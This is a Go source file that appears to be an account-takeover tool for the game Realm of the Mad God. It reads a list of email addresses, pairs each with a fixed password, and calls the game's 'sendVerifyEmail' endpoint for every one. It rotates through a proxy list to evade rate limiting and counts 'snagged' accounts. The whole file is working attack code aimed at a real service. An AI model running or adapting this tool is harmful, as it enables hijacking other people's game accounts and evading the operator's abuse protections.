package main

import (
	"os"
	"fmt"
	"time"
	"bytes"
	"bufio"
	"strings"
	"log"
	"net/url"
	"net/http"
	"io/ioutil"
)

var (
	verbose bool
	proxyList []string
	accountList map[string]string
	proxyIndex int
	totalAccounts int
	changedAccounts int
	startTime time.Time
	lastSleep time.Time
	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36"
	mainURL = "https://realmofthemadgodhrd.appspot.com/account/sendVerifyEmail?guid="
	secondURL = "&password="
	password = "password123456789"
)

func main() {
	log.Println("Started")
	verbose = true
	startTime = time.Now()
	accountList = make(map[string]string)
	readProxies()
	fmt.Printf("Using %d proxies\n", len(proxyList))
	readAccounts()
	fmt.Printf("Going through %d accounts\n", len(accountList))
	//redoList()
	startChanging()
	log.Printf("Done. Snagged %d accounts out of %d\n", changedAccounts, len(accountList))
}

func startChanging() {
	currentIndex := 0 //to keep track of what index of the loop we are at
	ipHits := 0
	for i := range accountList { //only go through once
		if proxyIndex >= len(proxyList) {
			proxyIndex = 0
		}
		if ipHits >= 9 {
			ipHits = 0
			proxyIndex++
		}
		email := i
		password := accountList[i]
		fullURL := mainURL + email + secondURL + password
		resp, err := getURL(fullURL, proxyIndex)
		ipHits++
		if err != nil { //todo: need redundancy check for dead proxies and retry on the same account
			buf := new(bytes.Buffer)
			fmt.Fprintf(buf, "%s || %s | %s\n", "ResendVerify", proxyList[proxyIndex], err.Error())
			file, err := os.OpenFile("errors.log", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0666)
			if err != nil {
				log.Println(err)
			}
			defer file.Close()
			if _, err := file.Write(buf.Bytes()); err != nil {
				log.Println(err)
			}
			proxyIndex++
		}
		if strings.Contains(resp, "Success") == true {
			changedAccounts++
			if verbose == true {
				fmt.Printf("Loop: %d | Proxy: %d | Snagged: %d | Email: %s\n", currentIndex, proxyIndex, changedAccounts, email)
			}
		} else if strings.Contains(resp, "wait") == true {
			proxyIndex++
			ipHits = 0
		} else if strings.Contains(resp, "incorrectEmailOrPassword") {
			//delete(accountList, i) //might cause issues so commenting out
		} else {
			log.Println("Got unknown response:", resp)
		}
		time.Sleep(1500 * time.Millisecond)
		currentIndex++
	}
}

func readAccounts() {
	f, err := os.Open("list.accounts")
	if err != nil {
		fmt.Printf("error opening accounts file: %s\n", err)
		os.Exit(1)
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		email := strings.Split(scanner.Text(), ":")[0]
		//password := strings.Split(scanner.Text(), ":")[1]
		password := "password1231"
		accountList[email] = password
	}
}

func readProxies() {
	f, err := os.Open("list.proxies")
	if err != nil {
		fmt.Printf("error opening proxies file: %s\n", err)
		os.Exit(1)
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		proxyList = append(proxyList, strings.Split(scanner.Text(), "\n")[0])
	}
}

func getURL(s string, i int) (string, error) {
	req, err := http.NewRequest(http.MethodGet, s, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("User-Agent", userAgent)
	if i != -1 {
		proxyURL, _ := url.Parse(proxyList[i])
		myClient := &http.Client{
			Transport: &http.Transport{
				Proxy: http.ProxyURL(proxyURL),
			},
		}
		ex, err := myClient.Do(req)
		if err != nil {
			return "", err
		}
		body, _ := ioutil.ReadAll(ex.Body)
		ex.Body.Close()
		return string(body), err
	}
	//no proxy, use actual ip
	myClient := &http.Client{}
	ex, err := myClient.Do(req)
	if err != nil {
		return "", err
	}
	body, _ := ioutil.ReadAll(ex.Body)
	ex.Body.Close()
	return string(body), err
}

func timeSince() int {
	return int(time.Duration(time.Since(startTime) / time.Minute))
}
